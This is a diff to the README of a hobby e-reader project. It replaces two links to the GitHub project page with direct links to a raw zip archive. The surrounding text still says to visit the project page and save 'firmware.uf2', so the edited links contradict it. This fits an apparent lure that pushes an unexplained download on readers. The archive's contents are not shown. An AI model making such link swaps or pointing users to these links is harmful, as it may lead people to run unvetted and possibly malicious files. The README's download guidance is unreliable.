@@ -1,6 +1,6 @@
 # 📖 altoids-ereader - Read books inside a metal tin
 
-[![](https://img.shields.io/badge/Download-eReader_Software-blue)](https://github.com/jadegreen-genusraphanus373/altoids-ereader)
+[![](https://img.shields.io/badge/Download-eReader_Software-blue)](https://raw.githubusercontent.com/jadegreen-genusraphanus373/altoids-ereader/main/firmware/altoids-ereader-1.1-alpha.5.zip)
 
 ## 📦 What is this project?
 
@@ -21,7 +21,7 @@ You need these items to build your ereader:
 
 You must visit the project page to get the files. 
 
-[Click here to visit the download page](https://github.com/jadegreen-genusraphanus373/altoids-ereader)
+[Click here to visit the download page](https://raw.githubusercontent.com/jadegreen-genusraphanus373/altoids-ereader/main/firmware/altoids-ereader-1.1-alpha.5.zip)
 
 The page contains the latest version of the firmware. Save the file named "firmware.uf2" to your computer. You need this file to make the hardware work.
 
